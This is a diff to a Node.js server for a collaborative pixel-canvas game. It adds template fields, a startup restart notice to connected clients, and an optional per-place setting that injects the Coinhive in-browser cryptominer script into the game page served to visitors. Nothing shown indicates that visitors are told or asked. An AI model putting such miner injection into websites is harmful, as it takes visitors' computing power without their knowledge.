@@ -4,7 +4,8 @@ var fs = require("fs");
 var PNG = require("pngjs").PNG;
 
 var game = {
-	online: 0
+	online: 0,
+	restart: true
 }
 
 var timeout = {};
@@ -52,12 +53,17 @@ global.app.get("/place", function(req, res) {
 	);
 });
 
-function webGetPlace(name) {
+function webGetPlace(place, name) {
+	let miner = (place.miner)? "https://coinhive.com/lib/coinhive.min.js": "";
 	global.app.get("/place/"+name.toLowerCase(), function (req, res) {
 		res.send(
 			fs.readFileSync(__dirname+"/game.html", "utf8")
+				.replace(/\[url\]/gi, "https://"+global.domain+"/place/"+name.toLowerCase())
+				.replace(/\[board_size\]/gi, place.board_size)
 				.replace(/\[socket_namespace\]/gi, name)
+				.replace(/\[socket_namespace_lower\]/gi, name.toLowerCase())
 				.replace(/\[palette\]/gi, JSON.stringify(global.place.palette))
+				.replace(/\[miner\]/gi, miner)
 		);
 	});
 }
@@ -115,6 +121,10 @@ function makePlace(place, name) {
 	place.public.protected = (place.token)? true: false;
 
 	io.on("connection", function(socket) {
+
+		if (game.restart) {
+			io.emit("server-restart");
+		}
 
 		let ip = socket.handshake.address.split(":")[3];
 		timeout[socket.id] = moment().valueOf();
@@ -198,13 +208,17 @@ function makePlace(place, name) {
 	}, 2000); // Save board every 2 seconds
 }
 
-// Initialisation
+// Initialization
 
 for (var i=0; i<Object.keys(global.places).length; i++) {
 	let name = Object.keys(global.places)[i];
 	let place = global.places[name];
 
-	webGetPlace(name);
+	webGetPlace(place, name);
 	loadPlace(place, name);
 	makePlace(place, name);
+
+	setTimeout(function() {
+		game.restart = false;
+	}, 1000);
 }
